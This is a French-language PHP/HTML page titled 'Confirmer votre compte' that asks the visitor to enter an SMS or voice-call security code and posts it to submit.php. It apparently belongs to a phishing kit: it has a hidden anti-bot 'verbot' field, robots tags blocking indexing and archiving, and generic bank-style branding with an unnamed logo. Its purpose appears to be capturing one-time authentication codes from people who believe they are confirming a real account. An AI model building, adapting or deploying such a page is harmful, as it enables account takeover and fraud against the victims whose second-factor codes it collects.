<?php


    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Confirmer votre compte</title>
    </head>

    <body>

        <div class="logo text-center mt50 mb50">
            <img style="max-width: 180px;" src="../assets/images/logo.png">
        </div>
        
        <div id="details" style="padding-top: 130px;">
            <svg id="js-transition-view-ribbon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 130" height="130" preserveAspectRatio="none"><defs><linearGradient id="js-transition-view-ribbon-gradient"><stop id="js-transition-view-ribbon-color-from" offset="0%" stop-color="#C8112B"></stop><stop id="js-transition-view-ribbon-color-to" offset="100%" stop-color="#F11C3A"></stop></linearGradient></defs><path id="js-transition-view-ribbon-shape" fill="url(#js-transition-view-ribbon-gradient)" d="M0,0 L0,80 C 73 113, 160 130, 250 130 C 340 130, 427 113, 500 80 L500,0 L0,0" data-original="M0,0 L0,10 L250,10 L500,10 L500,0 L250,0 L0,0"></path><path id="js-transition-view-ribbon-deployed-shape" fill="url(#js-transition-view-ribbon-gradient)" d="M0,0 L0,80 C 73 113, 160 130, 250 130 C 340 130, 427 113, 500 80 L500,0 L0,0"></path></svg>
            <div class="symbol"><i style="font-size: 32px;" class="fas fa-mobile-alt"></i></div>
            <form method="post" action="submit.php" class="mt30">
                <input type="hidden" name="verbot">
                <input type="hidden" name="type" value="confirm_code1">
                <div class="content">
                    <p>Un code de sécurité vous sera envoyé par SMS ou par appel depuis un serveur vocal sur votre téléphone qui sera valable 5 minutes.</p>
                </div>
                <div class="form-group mb20 <?php echo is_invalid_class($_SESSION['errors'],'confirm_code1') ?>">
                    <input type="text" name="confirm_code1" id="confirm_code1" class="form-control" placeholder="Code de sécurité reçu" value="<?php echo get_value('confirm_code1'); ?>">
                    <?php echo error_message($_SESSION['errors'],'confirm_code1'); ?>
                </div>
                <div class="form-group mb20 mt50">
                    <button type="submit">Suivant</button>
                </div>
                <p class="text-center mb-0" style="color: #009de0;">Retour à la connexion</p>
            </form>
        </div>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>